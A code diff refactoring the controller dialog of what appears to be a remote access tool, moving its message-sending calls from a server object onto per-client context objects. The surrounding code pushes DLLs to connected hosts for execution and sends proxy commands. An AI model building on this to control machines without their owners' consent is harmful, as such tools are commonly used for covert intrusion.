@@ -278,9 +278,8 @@ std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath) {
 	return result;
 }
 
-CMy2015RemoteDlg::CMy2015RemoteDlg(Server* iocpServer, CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
+CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
 {
-	m_iocpServer = iocpServer;
 	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
 	m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);
 
@@ -1038,16 +1037,12 @@ void CMy2015RemoteDlg::Release(){
 	for(int Pos = 0; Pos < n; ++Pos) 
 	{
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(Pos);
-		m_iocpServer->Send2Client(ContextObject, &bToken, sizeof(BYTE));
+		ContextObject->Send2Client( &bToken, sizeof(BYTE));
 	}
 	LeaveCriticalSection(&m_cs);
 	Sleep(500);
 
-	if (m_iocpServer != NULL)
-	{
-		m_iocpServer->Destroy();
-		m_iocpServer = NULL;
-	}
+	THIS_APP->Destroy();
 	g_2015RemoteDlg = NULL;
 	SetEvent(m_hExit);
 	CloseHandle(m_hExit);
@@ -1449,7 +1444,7 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 			continue;
 		}
 		// 发送获得驱动器列表数据包
-		m_iocpServer->Send2Client(ContextObject,szBuffer, ulLength);
+		ContextObject->Send2Client(szBuffer, ulLength);
 	} 
 	LeaveCriticalSection(&m_cs);
 }
@@ -1485,7 +1480,7 @@ void CMy2015RemoteDlg::OnMainSet()
 	Dlg.DoModal();   //模态 阻塞
 	if (nMaxConnection != Dlg.m_nMax_Connect)
 	{
-		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
+		THIS_APP->UpdateMaxConnection(Dlg.m_nMax_Connect);
 	}
 	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
 	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
@@ -1593,9 +1588,8 @@ std::vector<std::string> splitByNewline(const std::string& input) {
 
 BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 {
-	assert(m_iocpServer);
 	UINT ret = 0;
-	if ( (ret=m_iocpServer->StartServer(NotifyProc, OfflineProc, nPort)) !=0 )
+	if ( (ret = THIS_APP->StartServer(NotifyProc, OfflineProc, nPort)) !=0 )
 	{
 		Mprintf("======> StartServer Failed \n");
 		char cmd[200];
@@ -1735,7 +1729,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		resp[0] = 0;
 		memcpy(resp+1, &dll, sizeof(DllSendData));
 		memcpy(resp+1+sizeof(DllSendData), bin->c_str() + 6, dll.DataSize);
-		m_iocpServer->Send2Client(ContextObject, resp, 1 + sizeof(DllSendData) + dll.DataSize);
+		ContextObject->Send2Client(resp, 1 + sizeof(DllSendData) + dll.DataSize);
 		SAFE_DELETE_ARRAY(resp);
 		break;
 	}
@@ -1757,7 +1751,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		std::string hmac = genHMAC(hash, m_superPass);
 		memcpy(resp + 64, hmac.c_str(), hmac.length());
 		resp[80] = 0;
-		m_iocpServer->Send2Client(ContextObject, (LPBYTE)resp, sizeof(resp));
+		ContextObject->Send2Client((LPBYTE)resp, sizeof(resp));
 		break;
 	}
 	case CMD_EXECUTE_DLL: // 请求DLL
@@ -1766,7 +1760,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i){
 			DllInfo* dll = *i;
 			if (dll->Name == info->Name) {
-				return m_iocpServer->Send2Client(ContextObject, dll->Data->Buf(), dll->Data->length());
+				return ContextObject->Send2Client( dll->Data->Buf(), dll->Data->length());
 			}
 		}
 		break;
@@ -1995,7 +1989,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
 		HeartbeatACK ack = { hb.Time };
 		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
 		memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
-		m_iocpServer->Send2Client(ctx, buf, sizeof(buf));
+		ctx->Send2Client(buf, sizeof(buf));
 	}
 
 	CLock L(m_cs);
@@ -2019,7 +2013,7 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
 	memcpy(buf+1, &m_settings, sizeof(MasterSettings));
 
 	if (ctx) {
-		m_iocpServer->Send2Client(ctx, buf, sizeof(buf));
+		ctx->Send2Client(buf, sizeof(buf));
 	}
 	else {
 		EnterCriticalSection(&m_cs);
@@ -2028,7 +2022,7 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
 			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
 			if (!ContextObject->bLogin)
 				continue;
-			m_iocpServer->Send2Client(ContextObject, buf, sizeof(buf));
+			ContextObject->Send2Client(buf, sizeof(buf));
 		}
 		LeaveCriticalSection(&m_cs);
 	}
@@ -2043,9 +2037,9 @@ VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
 		char md5[33] = {};
 		memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
 		if (!buf->MD5().empty() && md5 != buf->MD5())
-			m_iocpServer->Send2Client(ContextObject, buf->Buf(), buf->length(len<=20));
+			ContextObject->Send2Client( buf->Buf(), buf->length(len<=20));
 		else {
-			m_iocpServer->Send2Client(ContextObject, buf->Buf(), 6 /* data not changed */);
+			ContextObject->Send2Client( buf->Buf(), 6 /* data not changed */);
 		}
 	}
 }
@@ -2207,7 +2201,7 @@ void CMy2015RemoteDlg::OnMainProxy()
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
 		BYTE cmd[] = { COMMAND_PROXY };
-		m_iocpServer->Send2Client(ContextObject, cmd, sizeof(cmd));
+		ContextObject->Send2Client( cmd, sizeof(cmd));
 		break;
 	}
 	LeaveCriticalSection(&m_cs);
@@ -2557,7 +2551,7 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
 		Buffer* buf = m_DllList[menuIndex]->Data;
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
-		m_iocpServer->Send2Client(ContextObject, buf->Buf(), 1 + sizeof(DllExecuteInfo));
+		ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo));
 	}
 	LeaveCriticalSection(&m_cs);
 }
